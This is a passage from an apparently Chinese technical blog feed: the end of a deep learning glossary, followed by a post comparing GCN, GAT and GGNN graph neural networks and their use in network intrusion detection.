href="http://cs231n.github.io/neural-networks-3/%EF%BC%89">http://cs231n.github.io/neural-networks-3/）</a><br>技术博客：理解用于自然语言处理的卷积神经网络（<a href="http://www.wildml.com/2015/11/understanding-convolutional-neural-networks-for-nlp/%EF%BC%89">http://www.wildml.com/2015/11/understanding-convolutional-neural-networks-for-nlp/）</a></p><h4 id="深度信念网络dbndeep-belief-network">深度信念网络（DBN：Deep Belief Network）</h4><p>DBN 是一类以无监督的方式学习数据的分层表征的概率图形模型。DBN 由多个隐藏层组成，这些隐藏层的每一对连续层之间的神经元是相互连接的。DBN 通过彼此堆叠多个 RBN（限制波尔兹曼机）并一个接一个地训练而创建。</p><p>论文：深度信念网络的一种快速学习算法（A fast learning algorithm for deep belief nets）</p><h4 id="deep-dream">Deep Dream</h4><p>这是谷歌发明的一种试图用来提炼深度卷积神经网络获取的知识的技术。这种技术可以生成新的图像或转换已有的图片从而给它们一种幻梦般的感觉，尤其是递归地应用时。</p><p>代码：Github 上的 Deep Dream（<a href="https://github.com/google/deepdream%EF%BC%89">https://github.com/google/deepdream）</a><br>技术博客：Inceptionism：向神经网络掘进更深（<a href="https://research.googleblog.com/2015/06/inceptionism-going-deeper-into-neural.html%EF%BC%89">https://research.googleblog.com/2015/06/inceptionism-going-deeper-into-neural.html）</a></p><h4 id="dropout">Dropout</h4><p>Dropout(随机失活) 是一种用于神经网络防止过拟合的正则化技术。它通过在每次训练迭代中随机地设置神经元中的一小部分为 0 来阻止神经元共适应（co-adapting），Dropout 可以通过多种方式进行解读，比如从不同网络的指数数字中随机取样。Dropout 层首先通过它们在卷积神经网络中的应用而得到普及，但自那以后也被应用到了其它层上，包括输入嵌入或循环网络。</p><p>通俗讲随机失活（Dropout）在训练的过程中以一定比例随机失活神经元来达到提高模型泛化能力的效果。</p><p>论文：Dropout: 一种防止神经网络过拟合的简单方法（Dropout: A Simple Way to Prevent Neural Networks from Overfitting）<br>论文：循环神经网络正则化（Recurrent Neural Network Regularization）</p><h4 id="嵌入embedding">嵌入（Embedding）</h4><p>一个嵌入映射到一个输入表征，比如一个词或一句话映射到一个矢量。一种流行的嵌入是词语嵌入（word embedding，国内常用的说法是：词向量），如 word2vec 或 GloVe。我们也可以嵌入句子、段落或图像。比如说，通过将图像和他们的文本描述映射到一个共同的嵌入空间中并最小化它们之间的距离，我们可以将标签和图像进行匹配。嵌入可以被明确地学习到，比如在 word2vec 中；嵌入也可作为监督任务的一部分例如情感分析（Sentiment Analysis）。通常一个网络的输入层是通过预先训练的嵌入进行初始化，然后再根据当前任务进行微调（fine-tuned）。</p><h4 id="梯度爆炸问题exploding-gradient-problem">梯度爆炸问题（Exploding Gradient Problem）</h4><p>梯度爆炸问题是梯度消失问题（Vanishing Gradient Problem）的对立面。在深度神经网络中，梯度可能会在反向传播过程中爆炸，导致数字溢出。解决梯度爆炸的一个常见技术是执行梯度裁剪（Gradient Clipping）。</p><p>论文：训练循环神经网络的困难之处（On the difficulty of training Recurrent Neural Networks）</p><h4 id="微调fine-tuning">微调（Fine-Tuning）</h4><p>Fine-Tuning 这种技术是指使用来自另一个任务（例如一个无监督训练网络）的参数初始化网络，然后再基于当前任务更新这些参数。比如，自然语言处理架构通常使用 word2vec 这样的预训练的词向量（word embeddings），然后这些词向量会在训练过程中基于特定的任务（如情感分析）进行更新。</p><h4 id="梯度裁剪gradient-clipping">梯度裁剪（Gradient Clipping）</h4><p>梯度裁剪是一种在非常深度的网络（通常是循环神经网络）中用于防止梯度爆炸（exploding gradient）的技术。执行梯度裁剪的方法有很多，但常见的一种是当参数矢量的 L2 范数（L2 norm）超过一个特定阈值时对参数矢量的梯度进行标准化，这个特定阈值根据函数：新梯度=梯度*阈值/L2范数（梯度）{new_gradients = gradients * threshold / l2_norm(gradients)}确定。</p><p>论文：训练循环神经网络的困难之处（On the difficulty of training Recurrent Neural Networks）</p><h4 id="glove">GloVe</h4><p>Glove 是一种为话语获取矢量表征（嵌入）的无监督学习算法。GloVe 的使用目的和 word2vec 一样，但 GloVe 具有不同的矢量表征，因为它是在共现（co-occurrence）统计数据上训练的。</p><p>论文：GloVe：用于词汇表征（Word Representation）的全局矢量（Global Vector）（GloVe: Global Vectors for Word Representation ）</p><h4 id="googlelenet">GoogleLeNet</h4><p>GoogleLeNet 是曾赢得了 2014 年 ILSVRC 挑战赛的一种卷积神经网络架构。这种网络使用 Inception 模块（Inception Module）以减少参数和提高网络中计算资源的利用率。</p><p>论文：使用卷积获得更深（Going Deeper with Convolutions）</p><h4 id="gru">GRU</h4><p>GRU（Gated Recurrent Unit：门控循环单元）是一种 LSTM 单元的简化版本，拥有更少的参数。和 LSTM 细胞（LSTM cell）一样，它使用门控机制，通过防止梯度消失问题（vanishing gradient problem）让循环神经网络可以有效学习长程依赖（long-range dependency）。GRU 包含一个复位和更新门，它们可以根据当前时间步骤的新值决定旧记忆中哪些部分需要保留或更新。</p><p>论文：为统计机器翻译使用 RNN 编码器-解码器学习短语表征（Learning Phrase Representations using RNN Encoder-Decoder for Statistical Machine Translation）<br>技术博客：循环神经网络教程，第 4 部分：用 Python 和 Theano 实现 GRU/LSTM RNN（<a href="http://www.wildml.com/2015/10/recurrent-neural-network-tutorial-part-4-implementing-a-grulstm-rnn-with-python-and-theano/%EF%BC%89">http://www.wildml.com/2015/10/recurrent-neural-network-tutorial-part-4-implementing-a-grulstm-rnn-with-python-and-theano/）</a></p><h4 id="ground-truth">ground truth</h4><p>在机器学习中， ground truth表示监督学习的训练集的分类准确性，用于证明或者推翻某个假设。有监督的机器学习会对训练数据打标记，试想一下如果训练标记错误，那么将会对测试数据的预测产生影响，因此这里将那些正确打标记的数据成为ground truth。</p><h4 id="highway-layer">Highway Layer</h4><p>Highway Layer　是使用门控机制控制通过层的信息流的一种神经网络层。堆叠多个 Highway Layer 层可让训练非常深的网络成为可能。Highway Layer 的工作原理是通过学习一个选择输入的哪部分通过和哪部分通过一个变换函数（如标准的仿射层）的门控函数来进行学习。Highway Layer 的基本公式是 T * h(x) + (1 - T) * x；其中 T 是学习过的门控函数，取值在 0 到 1 之间；h(x) 是一个任意的输入变换，x 是输入。注意所有这些都必须具有相同的大小。</p><p>论文：Highway Networks</p><h4 id="icml">ICML</h4><p>即国际机器学习大会（International Conference for Machine Learning），一个顶级的机器学习会议。</p><h4 id="ilsvrc">ILSVRC</h4><p>即 ImageNet 大型视觉识别挑战赛（ImageNet Large Scale Visual Recognition Challenge），该比赛用于评估大规模对象检测和图像分类的算法。它是计算机视觉领域最受欢迎的学术挑战赛。过去几年中，深度学习让错误率出现了显著下降，从 30% 降到了不到 5%，在许多分类任务中击败了人类。</p><h4 id="inception模块inception-module">Inception模块（Inception Module）</h4><p>Inception模块被用在卷积神经网络中，通过堆叠 1×1 卷积的降维（dimensionality reduction）带来更高效的计算和更深度的网络。</p><p>论文：使用卷积获得更深（Going Deeper with Convolutions）</p><h4 id="keras">Keras</h4><p>Kears 是一个基于 Python 的深度学习库，其中包括许多用于深度神经网络的高层次构建模块。它可以运行在 TensorFlow 或 Theano 上。</p><h4 id="lstm">LSTM</h4><p>长短期记忆（Long Short-Term Memory）网络通过使用内存门控机制防止循环神经网络（RNN）中的梯度消失问题（vanishing gradient problem）。使用 LSTM 单元计算 RNN 中的隐藏状态可以帮助该网络有效地传播梯度和学习长程依赖（long-range dependency）。</p><p>论文：长短期记忆（LONG SHORT-TERM MEMORY）<br>技术博客：理解 LSTM 网络（<a href="http://colah.github.io/posts/2015-08-Understanding-LSTMs/%EF%BC%89">http://colah.github.io/posts/2015-08-Understanding-LSTMs/）</a><br>技术博客：循环神经网络教程，第 4 部分：用 Python 和 Theano 实现 GRU/LSTM RNN（<a href="http://www.wildml.com/2015/10/recurrent-neural-network-tutorial-part-4-implementing-a-grulstm-rnn-with-python-and-theano/%EF%BC%89">http://www.wildml.com/2015/10/recurrent-neural-network-tutorial-part-4-implementing-a-grulstm-rnn-with-python-and-theano/）</a></p><h4 id="最大池化max-pooling">最大池化（Max-Pooling）</h4><p>池化（Pooling）操作通常被用在卷积神经网络中。一个最大池化层从一块特征中选取最大值。和卷积层一样，池化层也是通过窗口（块）大小和步幅尺寸进行参数化。比如，我们可能在一个 10×10 特征矩阵上以 2 的步幅滑动一个 2×2 的窗口，然后选取每个窗口的 4 个值中的最大值，得到一个 5×5 特征矩阵。池化层通过只保留最突出的信息来减少表征的维度；在这个图像输入的例子中，它们为转译提供了基本的不变性（即使图像偏移了几个像素，仍可选出同样的最大值）。池化层通常被安插在连续卷积层之间。</p><h4 id="mnist">MNIST</h4><p>MNIST数据集可能是最常用的一个图像识别数据集。它包含 60,000 个手写数字的训练样本和 10,000 个测试样本。每一张图像的尺寸为 28×28像素。目前最先进的模型通常能在该测试集中达到 99.5% 或更高的准确度。</p><h4 id="动量momentum">动量（Momentum）</h4><p>动量是梯度下降算法（Gradient Descent Algorithm）的扩展，可以加速和阻抑参数更新。在实际应用中，在梯度下降更新中包含一个动量项可在深度网络中得到更好的收敛速度（convergence rate）。</p><p>论文：通过反向传播（back-propagating error）错误学习表征</p><h4 id="多层感知器mlpmultilayer-perceptron">多层感知器（MLP：Multilayer Perceptron）</h4><p>多层感知器是一种带有多个全连接层的前馈神经网络，这些全连接层使用非线性激活函数（activation function）处理非线性可分的数据。MLP 是多层神经网络或有两层以上的深度神经网络的最基本形式。</p><p>负对数似然（NLL：Negative Log Likelihood）</p><p>参见分类交叉熵损失（Categorical Cross-Entropy Loss）。</p><h4 id="神经网络机器翻译nmtneural-machine-translation">神经网络机器翻译（NMT：Neural Machine Translation）</h4><p>NMT 系统使用神经网络实现语言（如英语和法语）之间的翻译。NMT 系统可以使用双语语料库进行端到端的训练，这有别于需要手工打造特征和开发的传统机器翻译系统。NMT 系统通常使用编码器和解码器循环神经网络实现，它可以分别编码源句和生成目标句。</p><p>论文：使用神经网络的序列到序列学习（Sequence to Sequence Learning with Neural Networks）<br>论文：为统计机器翻译使用 RNN 编码器-解码器学习短语表征（Learning Phrase Representations using RNN Encoder-Decoder for Statistical Machine Translation）</p><h4 id="神经图灵机ntmneural-turing-machine">神经图灵机（NTM：Neural Turing Machine）</h4><p>NTM 是可以从案例中推导简单算法的神经网络架构。比如，NTM 可以通过案例的输入和输出学习排序算法。NTM 通常学习记忆和注意机制的某些形式以处理程序执行过程中的状态。</p><p>论文：神经图灵机（Neural Turing Machines）</p><p>非线性（Nonlinearity）</p><p>参见激活函数（Activation Function）。</p><h4 id="噪音对比估计ncenoise-contrastive-estimation">噪音对比估计（NCE：noise-contrastive estimation）</h4><p>噪音对比估计是一种通常被用于训练带有大输出词汇的分类器的采样损失（sampling loss）。在大量的可能的类上计算 softmax 是异常昂贵的。使用 NCE，我们可以将问题降低成二元分类问题，这可以通过训练分类器区别对待取样和「真实」分布以及人工生成的噪声分布来实现。</p><p>论文：噪音对比估计：一种用于非标准化统计模型的新估计原理（Noise-contrastive estimation: A new estimation principle for unnormalized statistical models ）<br>论文：使用噪音对比估计有效地学习词向量（Learning word embeddings efficiently with noise-contrastive estimation）</p><h4 id="池化">池化</h4><p>参见最大池化（Max-Pooling）或平均池化（Average-Pooling）。</p><h4 id="受限玻尔兹曼机rbnrestricted-boltzmann-machine">受限玻尔兹曼机（RBN：Restricted Boltzmann Machine）</h4><p>RBN 是一种可被解释为一个随机人工神经网络的概率图形模型。RBN 以无监督的形式学习数据的表征。RBN 由可见层和隐藏层以及每一个这些层中的二元神经元的连接所构成。RBN 可以使用对比散度（contrastive divergence）进行有效的训练，这是梯度下降的一种近似。</p><p>第六章：动态系统中的信息处理：和谐理论基础<br>论文：受限玻尔兹曼机简介（An Introduction to Restricted Boltzmann Machines）</p><h4 id="循环神经网络rnnrecurrent-neural-network">循环神经网络（RNN：Recurrent Neural Network）</h4><p>RNN 模型通过隐藏状态（或称记忆）连续进行相互作用。它可以使用最多 N 个输入，并产生最多 N 个输出。比如，一个输入序列可能是一个句子，其输出为每个单词的词性标注（part-of-speech tag）（N 到 N）；一个输入可能是一个句子，其输出为该句子的情感分类（N 到 1）；一个输入可能是单个图像，其输出为描述该图像所对应一系列词语（1 到 N）。在每一个时间步骤中，RNN 会基于当前输入和之前的隐藏状态计算新的隐藏状态「记忆」。其中「循环（recurrent）」这个术语来自这个事实：在每一步中都是用了同样的参数，该网络根据不同的输入执行同样的计算。</p><p>技术博客：了解 LSTM 网络（<a href="http://colah.github.io/posts/2015-08-Understanding-LSTMs/%EF%BC%89">http://colah.github.io/posts/2015-08-Understanding-LSTMs/）</a><br>技术博客：循环神经网络教程第1部分——介绍 RNN （<a href="http://www.wildml.com/2015/09/recurrent-neural-networks-tutorial-part-1-introduction-to-rnns/%EF%BC%89">http://www.wildml.com/2015/09/recurrent-neural-networks-tutorial-part-1-introduction-to-rnns/）</a></p><h4 id="递归神经网络recursive-neural-network">递归神经网络（Recursive Neural Network）</h4><p>递归神经网络是循环神经网络的树状结构的一种泛化（generalization）。每一次递归都使用相同的权重。就像 RNN 一样，递归神经网络可以使用向后传播（backpropagation）进行端到端的训练。尽管可以学习树结构以将其用作优化问题的一部分，但递归神经网络通常被用在已有预定义结构的问题中，如自然语言处理的解析树中。</p><p>论文：使用递归神经网络解析自然场景和自然语言（Parsing Natural Scenes and Natural Language with Recursive Neural Networks ）</p><h4 id="relu">ReLU</h4><p>即线性修正单元（Rectified Linear Unit）。ReLU 常在深度神经网络中被用作激活函数。它们的定义是 f(x) = max(0, x) 。ReLU 相对于 tanh 等函数的优势包括它们往往很稀疏（它们的活化可以很容易设置为 0），而且它们受到梯度消失问题的影响也更小。ReLU 主要被用在卷积神经网络中用作激活函数。ReLU 存在几种变体，如Leaky ReLUs、Parametric ReLU (PReLU) 或更为流畅的 softplus近似。</p><p>论文：深入研究修正器（Rectifiers）：在 ImageNet 分类上超越人类水平的性能（Delving Deep into Rectifiers: Surpassing Human-Level Performance on ImageNet Classification）<br>论文：修正非线性改进神经网络声学模型（Rectifier Nonlinearities Improve Neural Network Acoustic Models ）<br>论文：线性修正单元改进受限玻尔兹曼机（Rectified Linear Units Improve Restricted Boltzmann Machines ）</p><h4 id="残差网络resnet">残差网络（ResNet）</h4><p>深度残差网络（Deep Residual Network）赢得了 2015 年的 ILSVRC 挑战赛。这些网络的工作方式是引入跨层堆栈的快捷连接，让优化器可以学习更「容易」的残差映射（residual mapping）而非更为复杂的原映射（original mapping）。这些快捷连接和 Highway Layer 类似，但它们与数据无关且不会引入额外的参数或训练复杂度。ResNet 在 ImageNet 测试集中实现了 3.57% 的错误率。</p><p>论文：用于图像识别的深度残差网络（Deep Residual Learning for Image Recognition）</p><h4 id="rmsprop">RMSProp</h4><p>RMSProp 是一种基于梯度的优化算法。它与 Adagrad 类似，但引入了一个额外的衰减项抵消 Adagrad 在学习率上的快速下降。</p><p>PPT：用于机器学习的神经网络 讲座6a<br>技术博客：斯坦福CS231n：优化算法（<a href="http://cs231n.github.io/neural-networks-3/%EF%BC%89">http://cs231n.github.io/neural-networks-3/）</a><br>技术博客：梯度下降优化算法概述（<a href="http://sebastianruder.com/optimizing-gradient-descent/%EF%BC%89">http://sebastianruder.com/optimizing-gradient-descent/）</a></p><h4 id="序列到序列seq2seq">序列到序列（Seq2Seq）</h4><p>序列到序列（Sequence-to-Sequence）模型读取一个序列（如一个句子）作为输入，然后产生另一个序列作为输出。它和标准的 RNN 不同；在标准的 RNN 中，输入序列会在网络开始产生任何输出之前被完整地读取。通常而言，Seq2Seq 通过两个分别作为编码器和解码器的 RNN 实现。神经网络机器翻译是一类典型的 Seq2Seq 模型。</p><p>论文：使用神经网络的序列到序列学习（Sequence to Sequence Learning with Neural Networks）</p><h4 id="随机梯度下降sgdstochastic-gradient-descent">随机梯度下降（SGD：Stochastic Gradient Descent）</h4><p>随机梯度下降是一种被用在训练阶段学习网络参数的基于梯度的优化算法。梯度通常使用反向传播算法计算。在实际应用中，人们使用微小批量版本的 SGD，其中的参数更新基于批案例而非单个案例进行执行，这能增加计算效率。vanilla SGD 存在许多扩展，包括动量（Momentum）、Adagrad、rmsprop、Adadelta 或 Adam。</p><p>论文：用于在线学习和随机优化的自适应次梯度方法（Adaptive Subgradient Methods for Online Learning and Stochastic Optimization）<br>技术博客：斯坦福CS231n：优化算法（<a href="http://cs231n.github.io/neural-networks-3/%EF%BC%89">http://cs231n.github.io/neural-networks-3/）</a><br>技术博客：梯度下降优化算法概述（<a href="http://sebastianruder.com/optimizing-gradient-descent/%EF%BC%89">http://sebastianruder.com/optimizing-gradient-descent/）</a></p><h4 id="softmax">Softmax</h4><p>Softmax 函数通常被用于将原始分数（raw score）的矢量转换成用于分类的神经网络的输出层上的类概率（class probability）。它通过对归一化常数（normalization constant）进行指数化和相除运算而对分数进行规范化。如果我们正在处理大量的类，例如机器翻译中的大量词汇，计算归一化常数是很昂贵的。有许多种可以让计算更高效的替代选择，包括分层 Softmax（Hierarchical Softmax）或使用基于取样的损失函数，如 NCE。</p><h4 id="tensorflow">TensorFlow</h4><p>TensorFlow是一个开源 C ++ / Python 软件库，用于使用数据流图的数值计算，尤其是深度神经网络。它是由谷歌创建的。在设计方面，它最类似于 Theano，但比 Caffe 或 Keras 更低级。</p><h4 id="theano">Theano</h4><p>Theano 是一个让你可以定义、优化和评估数学表达式的 Python 库。它包含许多用于深度神经网络的构造模块。Theano 是类似于 TensorFlow 的低级别库。更高级别的库包括Keras 和 Caffe。</p><h4 id="梯度消失问题vanishing-gradient-problem">梯度消失问题（Vanishing Gradient Problem）</h4><p>梯度消失问题出现在使用梯度很小（在 0 到 1 的范围内）的激活函数的非常深的神经网络中，通常是循环神经网络。因为这些小梯度会在反向传播中相乘，它们往往在这些层中传播时「消失」，从而让网络无法学习长程依赖。解决这一问题的常用方法是使用 ReLU 这样的不受小梯度影响的激活函数，或使用明确针对消失梯度问题的架构，如LSTM。这个问题的反面被称为梯度爆炸问题（exploding gradient problem）。</p><p>论文：训练循环神经网络的困难之处（On the difficulty of training Recurrent Neural Networks）</p><h4 id="vgg">VGG</h4><p>VGG 是在 2014 年 ImageNet 定位和分类比赛中分别斩获第一和第二位置的卷积神经网络模型。这个 VGG 模型包含 16-19 个权重层，并使用了大小为 3×3 和 1×1 的小型卷积过滤器。</p><p>论文：用于大规模图像识别的非常深度的卷积网络（Very Deep Convolutional Networks for Large-Scale Image Recognition）</p><h4 id="word2vec">word2vec</h4><p>word2vec 是一种试图通过预测文档中话语的上下文来学习词向量（word embedding）的算法和工具 (<a href="https://code.google.com/p/word2vec/">https://code.google.com/p/word2vec/</a>)。最终得到的词矢量（word vector）有一些有趣的性质，例如vector(‘queen’) ~= vector(‘king’) - vector(‘man’) + vector(‘woman’) （女王~=国王-男人+女人）。两个不同的目标函数可以用来学习这些嵌入：Skip-Gram 目标函数尝试预测一个词的上下文，CBOW 目标函数则尝试从词上下文预测这个词。</p><p>论文：向量空间中词汇表征的有效评估（Efficient Estimation of Word Representations in Vector Space）<br>论文：分布式词汇和短语表征以及他们的组合性（Distributed Representations of Words and Phrases and their Compositionality）<br>论文：解释 word2vec 参数学习（word2vec Parameter Learning Explained）</p>]]></content>
      
      
      <categories>
          
          <category> Deep Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Terms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GCN,GAT,GGNN</title>
      <link href="/2023/10/10/AILearning/GNN/GCN%20GAT%20GGNN/"/>
      <url>/2023/10/10/AILearning/GNN/GCN%20GAT%20GGNN/</url>
      
        <content type="html"><![CDATA[<h1 id="gcngatggnn">GCN,GAT,GGNN</h1><p>GCN（Graph Convolutional Network），GAT（Graph Attention Network）和GGNN（Graph Gated Neural Network）都是用于图结构数据的深度学习模型，但它们在架构和工作原理上有一些异同点。下面是它们的异同点以及各自的优点和缺点：</p><ul><li><p>异同点：</p><p>架构：GCN和GAT是基于图卷积的模型，而GGNN是基于循环神经网络的模型。 模型目标：GCN和GAT主要用于节点级别的任务，如节点分类和节点属性预测。GGNN主要用于图级别的任务，如图分类和图生成。 信息传播方式：GCN使用固定的邻居聚集方式传播信息，GAT使用自适应的注意力机制对邻居节点进行加权聚合，GGNN通过循环神经网络在节点之间传递信息。 参数共享：GCN和GAT在不同节点之间共享参数，而GGNN在循环过程中使用不同的参数。 可扩展性：GAT和GGNN在处理大型图时可能更具可扩展性，因为它们可以根据需要选择性聚合邻居节点的信息。</p></li><li><p>优点和缺点：</p><p>GCN：</p><p>优点：简单且易于实现，具有较好的可解释性，适用于节点级别的任务，能够捕捉节点之间的局部结构信息。 缺点：在处理大型图时可能存在计算和存储的挑战，对于全局图结构的建模能力有限</p><p>GAT：</p><p>优点：能够自适应地学习节点之间的关系权重，具有更强的建模能力，适用于节点级别的任务，对于稀疏图效果较好。 缺点：计算复杂度较高，对于大型图可能存在挑战。</p><p>GGNN：</p><p>优点：能够在循环过程中对节点之间的信息进行迭代传递，适用于图级别的任务，对于具有长程依赖关系的图结构效果较好。 缺点：对于每个节点的信息传播迭代次数有限，可能较难捕捉全局图结构信息，对于大型图可能存在计算和存储的挑战。</p></li></ul><p><a href="https://github.com/calebmah/ggnn.pytorch">https://github.com/calebmah/ggnn.pytorch</a></p><p><a href="https://blog.csdn.net/Orangetc/article/details/115986351">门控图神经网络（GGNN）及代码分析_Orangetc的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_43714954/article/details/100154348">门控图神经网络及PyTorch实现_门控图序列神经网络-CSDN博客</a></p><p><a href="https://zhuanlan.zhihu.com/p/135366196">图神经网络入门（二）GRN图循环网络</a></p><p><strong><a href="https://docs.dgl.ai/en/latest/api/python/graph.html">https://docs.dgl.ai/en/latest/api/python/graph.html</a></strong></p><p><a href="https://docs.dgl.ai/guide_cn/index.html">用户指南 — DGL 1.1.2post1 documentation</a></p><h2 id="零-消息传递"><strong>零、消息传递</strong></h2><p>消息传递是指在<a href="https://so.csdn.net/so/search?q=%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C&amp;spm=1001.2101.3001.7020">图神经网络</a>（Graph Neural Network，GNN）中，从节点向邻居节点传递信息的过程。这个过程通常被称为“<strong>消息传递步骤</strong>”或“信息传播步骤”。</p><p>在消息传递步骤中，每个节点将自身的特征和邻居节点的特征合并，并计算出一个新的节点表示，然后将这个新的节点表示传递给下一个消息传递步骤或最终的输出层。这个过程通常由以下几个步骤组成：</p><ol><li><strong>聚合邻居节点的信息</strong>：对于每个节点，聚合其邻居节点的信息。这个过程通常可以通过计算邻居节点特征的平均值、最大值、加权平均值等方式实现。</li><li><strong>更新节点的表示</strong>：使用聚合后的邻居节点信息和当前节点自身的特征，计算出一个新的节点表示。这个过程通常可以通过一个多层感知机（MLP）来实现，其中MLP的输入是当前节点的特征和聚合后的邻居节点信息，输出是一个新的节点表示。</li><li><strong>更新图中所有节点的表示</strong>：对于图中的每个节点，都执行上述两个步骤，以更新它们的节点表示。这个过程可以通过并行计算来加速。</li><li><strong>后续处理步骤</strong>：在更新完所有节点的表示后，可以执行一些可选的后处理步骤，如归一化、dropout等操作，以进一步提高模型的性能。</li></ol><p>总体而言，消息传递步骤是<a href="https://so.csdn.net/so/search?q=GNN&amp;spm=1001.2101.3001.7020">GNN</a>中非常重要的一步，它通过邻居节点之间的信息传递来捕捉节点之间的关系，从而提高模型的性能。在实际应用中，不同的GNN模型可以使用不同的消息传递方式和后处理步骤，以适应不同的任务和数据集。</p><h2 id="一-ggnn门控图神经网络"><strong>一、GGNN（门控图神经网络）</strong></h2><p>GGNN，全称Gated Graph Sequence Neural Networks，中文名为“门控图神经网络”。GGNN与通常的图神经网络网络不同之处在于<strong>其消息传递步骤中使用了GRU单元。具体来说，在GGNN中，每个节点在每一次迭代时都会接收来自邻居节点的消息，这些消息会经过GRUcell进行整合和更新</strong>。在每次迭代之后，节点的表示也会根据当前状态进行更新。GRUcell在这个过程中扮演了重要的角色，<strong>通过门控机制来控制信息的流动和筛选</strong>。</p><p>以下为<a href="https://so.csdn.net/so/search?q=GRU&amp;spm=1001.2101.3001.7020">GRU</a>简介：</p><p>GRU（Gated Recurrent Unit）是一种递归神经网络（RNN）的变体，用于处理序列数据。与标准的RNN相比，GRU具有更少的参数和更好的性能。GRU中的核心组件是GRU单元，它是一种门控单元。</p><p>GRU单元包含三个门控：重置门（reset gate）、更新门（update gate）和候选隐藏状态（candidate hidden state）。每个门控都是一个向量，其中每个元素都是介于0和1之间的实数，表示门控的打开和关闭程度。</p><p>在每个时间步，GRU单元会根据当前输入、前一时刻的隐藏状态和当前时刻的候选隐藏状态来计算更新门和重置门，从而更新当前时刻的隐藏状态。</p><p>同时，GRU具有<strong>记忆性</strong>，GRU中的重置门（reset gate）和更新门（update gate）能够控制前一时刻的状态是否需要被遗忘或更新，从而实现记忆功能。当重置门打开时，前一时刻的状态可以被快速遗忘，而当更新门打开时，前一时刻的状态可以被更新和传递到当前时刻。这种门控机制能够有效地处理梯度消失和梯度爆炸问题，从而能够更好地捕捉长序列的依赖关系和保留历史信息，实现记忆功能。<strong>因此，GRU具有记忆性，能够在处理时序数据时捕捉时间信息，并根据时间序列的演化变化自适应地更新和维护历史状态信息。</strong></p><p>使用GRUcell来实现消息传递步骤具有以下优势：</p><ol><li><strong>可以学习不同节点之间的相互关系</strong>。GRUcell通过门控机制来控制信息的流动和筛选，能够学习不同节点之间的相互关系，从而更好地捕捉节点之间的依赖关系。</li><li><strong>具有时间递归性质</strong>。GRUcell能够在每个迭代步骤中更新节点的状态，从而具有时间递归性质。这种递归性质能够让模型<strong>更好地处理图中的时序信息</strong>。</li><li><strong>可以处理变长输入</strong>。GRUcell能够处理变长输入，可以自适应地对每个节点的输入进行处理，从而能够处理不同大小和形状的图数据。</li><li><strong>计算效率高</strong>。GRUcell具有较少的参数量和计算量，能够在较短的时间内完成消息传递步骤的计算。这种计算效率在处理大规模图数据时特别有优势。</li></ol><p>如果将其应用于<strong>入侵检测系统</strong>，由于GRU具有记忆性，GGNN具有时间递归性质，能够在每个迭代步骤中更新节点的状态和特征表示，从而<strong>能够捕捉网络流的时间演化特征，能够有效地利用历史信息</strong>，提高入侵检测的准确性和实用性。</p><h2 id="二-gcn图卷积神经网络"><strong>二、GCN（图卷积神经网络）</strong></h2><p>相比于普通的图神经网络，GCN能够利用节点特征和邻居特征、保留全局结构信息、具有较好的可扩展性、适用于半监督和无监督学习、具有较好的鲁棒性等特点，能够更好地处理图数据的任务。</p><p>GCN通过图卷积操作，能够利用节点的特征和邻居的特征进行信息传递和特征更新。这种方式能够在一定程度上<strong>捕捉节点之间的结构和依赖关系</strong>，从而更好地表示节点的特征。</p><p>GCN能够<strong>保留整个图的全局结构信息</strong>，从而能够更好地捕捉节点之间的关系和依赖关系。这种全局结构信息的保留能够使得模型更加稳定，同时也能够避免过度拟合。</p><p>GCN具有<strong>较好的鲁棒性</strong>，能够在图数据中处理缺失节点、噪声和异常节点等情况。这得益于GCN中的图卷积操作和正则化机制，能够在一定程度上平滑节点的特征，并对模型进行正则化，从而提高模型的鲁棒性。</p><p><strong>有关GCN的构建：</strong></p><ul><li>图卷积操作：GCN中最重要的组件是图卷积操作，用于在节点之间传递信息以更新它们的表示向量。这种操作使用图的邻接矩阵来计算每个节点的聚合向量，以及一个可学习的权重矩阵来将节点表示向量映射到一个新的表示空间中。</li><li>节点特征表示：GCN通常假设每个节点都具有一个固定的特征向量，作为节点的初始表示。在某些情况下，这些特征向量可能是从外部输入的，而在其他情况下，可以通过对节点的邻居节点特征向量进行聚合来计算每个节点的特征向量。</li><li>图的规范化：为了在GCN中执行有效的卷积操作，需要对邻接矩阵进行规范化。通常使用对称规范化或左规范化来保持特定性质，例如捕捉节点度数的影响，或者防止梯度爆炸或消失问题。</li><li>层间连接方式：在普通的图神经网络中，层间节点的连接通常是全连接的，即每个节点都与前一层中的所有节点连接。而在GCN中，每个节点的连接只限于其邻居节点，这有助于减少参数量，并更好地捕捉图的局部结构。</li><li>激活函数：在普通的图神经网络中，通常使用ReLU作为激活函数。在GCN中，由于传统的ReLU无法保持特定性质，例如正则化性质和图形同构性，因此通常使用针对图卷积操作的特定激活函数，例如GraphSAGE中使用的Maxpooling。</li></ul><hr><p>相比于普通图神经网络，图卷积神经网络（GCN）应用于<strong>入侵检测系统</strong>的优势主要为拥有<strong>强大的建模能力</strong>，能够有效地捕捉节点和边的关系，并从整体上理解网络拓扑结构和演化过程。在入侵检测系统中，网络流量数据可以看作是一个复杂的图结构，GCN能够更好地建模这种图形结构，从而提高检测准确率和性能。</p><p>GCN能够对每个节点或边的权重进行解释，从而<strong>提高了入侵检测的可解释性和可理解性</strong>。在入侵检测中，对于每个节点或边的权重解释，有助于理解哪些节点或边对于攻击检测有更重要的贡献。</p><p>GCN在训练过程中使用图结构信息，这使得它<strong>对于图形结构的变化或攻击具有一定的稳健性</strong>，这是普通神经网络所没有的。这种稳健性在入侵检测系统中是非常重要的，因为攻击者可能会试图欺骗检测系统，通过修改流量数据中的节点或边来逃避检测。</p><p>GCN能够在多个不同网络流量数据集之间进行<strong>数据共享</strong>，这有助于提高模型的泛化能力和效率，并降低数据量的需求。这在实际应用中非常重要，因为安全数据集通常是非常稀缺和昂贵的。</p><h2 